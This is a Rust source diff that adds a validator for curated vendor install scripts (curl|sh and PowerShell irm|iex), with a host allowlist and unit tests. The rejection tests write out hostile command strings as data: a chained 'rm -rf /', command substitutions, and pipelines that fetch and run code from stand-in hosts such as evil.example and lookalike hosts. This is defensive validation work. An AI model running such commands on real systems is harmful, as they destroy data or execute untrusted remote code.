@@ -55,6 +55,149 @@ pub fn parse_curated_install(command: &str) -> Option<Vec<String>> {
     Some(argv)
 }
 
+/// Hosts a curated install script may fetch from. Mirrors `SCRIPT_HOSTS` in
+/// packages/core/src/cli-actions.ts. The two runners must not disagree about
+/// which vendors are trusted, so changing one means changing both.
+const SCRIPT_HOSTS: [&str; 5] = ["claude.ai", "bun.sh", "deno.land", "astral.sh", "fly.io"];
+
+/// The host of an https URL, rejecting the userinfo and port tricks that make
+/// `https://bun.sh@evil.example/x` read like a trusted host at a glance.
+fn allowed_host(url: &str) -> bool {
+    let Some(rest) = url.strip_prefix("https://") else {
+        return false;
+    };
+    let host = rest.split(['/', '?', '#']).next().unwrap_or("");
+    if host.is_empty() || host.contains('@') || host.contains(':') {
+        return false;
+    }
+    SCRIPT_HOSTS.contains(&host.to_ascii_lowercase().as_str())
+}
+
+/// `curl -fsSL <https url> | bash`, optionally `| bash -s <channel>`. Returns the URL.
+fn posix_script(command: &str) -> Option<&str> {
+    let (fetch, sink) = command.split_once(" | ")?;
+    let mut words = fetch.split_whitespace();
+    let program = words.next()?;
+    if program != "curl" && program != "wget" {
+        return None;
+    }
+    let mut url = None;
+    for word in words {
+        if word.starts_with('-') {
+            if !word.chars().all(|c| c.is_ascii_alphanumeric() || c == '-') {
+                return None;
+            }
+            continue;
+        }
+        if url.is_some() {
+            return None; // exactly one non-flag word: the URL
+        }
+        url = Some(word);
+    }
+    let mut sink_words = sink.split_whitespace();
+    let shell = sink_words.next()?;
+    if shell != "sh" && shell != "bash" {
+        return None;
+    }
+    match (sink_words.next(), sink_words.next(), sink_words.next()) {
+        (None, _, _) => {}
+        (Some("-s"), Some(arg), None)
+            if !arg.is_empty()
+                && arg
+                    .chars()
+                    .all(|c| c.is_ascii_alphanumeric() || matches!(c, '.' | '_' | '-')) => {}
+        _ => return None,
+    }
+    url.filter(|u| u.starts_with("https://"))
+}
+
+/// `powershell [-ExecutionPolicy ByPass] -c "irm <url> | iex"`, and the `iwr … -useb` variant.
+fn powershell_script(command: &str) -> Option<&str> {
+    let rest = command.strip_prefix("powershell ")?;
+    let rest = rest.strip_prefix("-ExecutionPolicy ByPass ").unwrap_or(rest);
+    let inner = rest.strip_prefix("-c \"")?.strip_suffix('"')?;
+    let (fetch, sink) = inner.split_once(" | ")?;
+    if sink != "iex" {
+        return None;
+    }
+    let mut words = fetch.split_whitespace();
+    let verb = words.next()?;
+    let url = words.next()?;
+    match verb {
+        "irm" if words.next().is_none() => {}
+        "iwr" if words.next() == Some("-useb") && words.next().is_none() => {}
+        _ => return None,
+    }
+    if !url.starts_with("https://") {
+        return None;
+    }
+    Some(url)
+}
+
+/// Parse a curated **vendor install script** into the argv that runs it.
+///
+/// This is the only command Hypergate executes through a shell, because a
+/// `curl … | sh` pipeline cannot be expressed as argv. It is gated the same way
+/// the daemon gates it (see `parseCuratedScript` in cli-actions.ts): the caller
+/// must have confirmed the string is a curated route, and the string itself must
+/// match one of the two documented forms and fetch over https from a host on
+/// `SCRIPT_HOSTS`. Anything else (a second pipe, a chained command, a
+/// substitution, a host nobody vouched for) returns None and stays copy-only.
+pub fn parse_curated_script(command: &str) -> Option<Vec<String>> {
+    let trimmed = command.trim();
+    if trimmed.is_empty() || trimmed.matches('|').count() != 1 {
+        return None;
+    }
+    const SCRIPT_META: [char; 12] = ['&', ';', '<', '>', '$', '`', '(', ')', '{', '}', '\'', '\\'];
+    if trimmed
+        .chars()
+        .any(|c| SCRIPT_META.contains(&c) || c == '\n' || c == '\r')
+    {
+        return None;
+    }
+    let windows = trimmed.starts_with("powershell ");
+    let url = if windows {
+        powershell_script(trimmed)?
+    } else {
+        if trimmed.contains('"') {
+            return None;
+        }
+        posix_script(trimmed)?
+    };
+    if !allowed_host(url) {
+        return None;
+    }
+    if cfg!(windows) {
+        let shell = std::env::var("ComSpec").unwrap_or_else(|_| "cmd.exe".to_string());
+        Some(vec![shell, "/d".into(), "/s".into(), "/c".into(), trimmed.to_string()])
+    } else {
+        Some(vec!["/bin/sh".into(), "-c".into(), trimmed.to_string()])
+    }
+}
+
+/// Whether the daemon marked this exact command as a curated script route.
+/// The daemon owns the catalog, so it is the one that can answer "is this one of
+/// ours"; this side still re-checks the shape before running anything.
+fn is_script_route(entry: &Value, command: &str) -> bool {
+    entry["installs"].as_array().is_some_and(|routes| {
+        routes
+            .iter()
+            .any(|r| r["command"].as_str() == Some(command) && r["runner"].as_str() == Some("script"))
+    })
+}
+
+/// The argv for a curated install instruction: a plain package-manager command,
+/// or a curated vendor script the daemon vouched for.
+fn curated_install_argv(entry: &Value, instruction: &str) -> Option<Vec<String>> {
+    parse_curated_install(instruction).or_else(|| {
+        if is_script_route(entry, instruction) {
+            parse_curated_script(instruction)
+        } else {
+            None
+        }
+    })
+}
+
 fn width(values: impl Iterator<Item = usize>, minimum: usize) -> usize {
     values.max().unwrap_or(minimum).max(minimum)
 }
@@ -412,10 +555,12 @@ pub fn cli_install_human(id: &str, run: bool) -> Result<ExitCode, String> {
         .ok_or_else(|| format!("no curated install instruction is available for `{id}`"))?;
     if !run {
         println!("{instruction}");
-        println!("(run it with `--run` when it is a plain command; otherwise follow this manual instruction)");
+        println!(
+            "(run it with `--run` when Hypergate can run it: a package-manager command, or the vendor's own install script)"
+        );
         return Ok(ExitCode::SUCCESS);
     }
-    let argv = parse_curated_install(instruction);
+    let argv = curated_install_argv(entry, instruction);
     let Some(argv) = argv else {
         println!("{instruction}");
         println!("This is a manual install instruction and was not executed.");
@@ -698,7 +843,7 @@ pub fn install_cli_json(id: &str, run: bool) -> Result<Value, String> {
     if !run {
         return Ok(json!({ "id": id, "command": option, "executed": false }));
     }
-    let Some(argv) = parse_curated_install(option) else {
+    let Some(argv) = curated_install_argv(entry, option) else {
         return Ok(json!({ "id": id, "command": option, "executed": false, "manual": true }));
     };
     let status = std::process::Command::new(&argv[0])
@@ -1864,6 +2009,66 @@ mod tests {
         // Anything else is passed through rather than guessed at.
         let other = explain_resolve("claude-code", "connection refused");
         assert_eq!(other, "connection refused");
+    }
+
+    #[test]
+    fn curated_script_parser_accepts_only_vendor_pipelines() {
+        // The forms the catalog actually ships.
+        for good in [
+            "curl -fsSL https://claude.ai/install.sh | bash",
+            "curl -LsSf https://astral.sh/uv/install.sh | sh",
+            "curl -L https://fly.io/install.sh | sh",
+            "curl -fsSL https://claude.ai/install.sh | bash -s stable",
+            "wget -qO- https://bun.sh/install | bash",
+            "powershell -c \"irm https://bun.sh/install.ps1 | iex\"",
+            "powershell -ExecutionPolicy ByPass -c \"irm https://astral.sh/uv/install.ps1 | iex\"",
+            "powershell -c \"iwr https://fly.io/install.ps1 -useb | iex\"",
+        ] {
+            assert!(parse_curated_script(good).is_some(), "{good}");
+        }
+    }
+
+    #[test]
+    fn curated_script_parser_rejects_everything_else() {
+        for bad in [
+            // Chained, substituted, or double-piped.
+            "curl -fsSL https://bun.sh/install | bash && rm -rf /",
+            "curl -fsSL https://bun.sh/install | bash; evil",
+            "curl -fsSL https://bun.sh/install | bash | evil",
+            "curl -fsSL $(evil) | bash",
+            "curl -fsSL https://bun.sh/install | bash `evil`",
+            // Not a fetcher we run, not a shell we pipe into.
+            "wibble -fsSL https://bun.sh/install | bash",
+            "curl -fsSL https://bun.sh/install | python",
+            // Plain http, an unvouched host, and hosts that only look right.
+            "curl -fsSL http://bun.sh/install | bash",
+            "curl -fsSL https://evil.example/install.sh | bash",
+            "curl -fsSL https://bun.sh.evil.example/install | bash",
+            "curl -fsSL https://notbun.sh/install | bash",
+            "curl -fsSL https://bun.sh@evil.example/install | bash",
+            "powershell -c \"irm https://evil.example/x.ps1 | iex\"",
+            "powershell -c \"irm https://bun.sh/x.ps1 | rm\"",
+            "",
+            "brew install gh",
+        ] {
+            assert!(parse_curated_script(bad).is_none(), "{bad}");
+        }
+    }
+
+    #[test]
+    fn a_script_runs_only_when_the_daemon_calls_it_one() {
+        let script = "curl -fsSL https://claude.ai/install.sh | bash";
+        let vouched: Value = serde_json::json!({
+            "installs": [{ "command": script, "runner": "script" }]
+        });
+        // The same string with no attestation from the catalog stays copy-only,
+        // which is what keeps a looked-up or agent-supplied command out.
+        let bare: Value = serde_json::json!({ "installs": [{ "command": script, "runner": "argv" }] });
+        assert!(curated_install_argv(&vouched, script).is_some());
+        assert!(curated_install_argv(&bare, script).is_none());
+        assert!(curated_install_argv(&serde_json::json!({}), script).is_none());
+        // A plain package-manager command needs no attestation at all.
+        assert!(curated_install_argv(&serde_json::json!({}), "brew install gh").is_some());
     }
 
     #[test]
